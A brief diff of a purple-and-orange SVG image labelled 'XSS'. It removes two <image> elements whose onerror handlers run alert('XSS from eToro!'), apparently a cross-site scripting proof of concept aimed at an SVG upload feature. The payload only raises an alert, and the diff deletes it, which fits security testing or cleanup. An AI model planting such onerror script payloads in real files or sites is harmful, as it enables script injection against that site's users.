@@ -2,6 +2,4 @@
   <rect width="100" height="100" fill="purple"/>
   <circle cx="50" cy="50" r="40" fill="orange"/>
   <text x="50" y="55" font-size="12" text-anchor="middle" fill="white">XSS</text>
-  <image href="https://raw.githubusercontent.com/h1tbug0/temp/refs/heads/main/icon.jpg" onerror="alert('XSS from eToro!')" width="100" height="100"/>
-  <image href="x" onerror="alert('XSS from eToro!')" width="100" height="100"/>
 </svg>
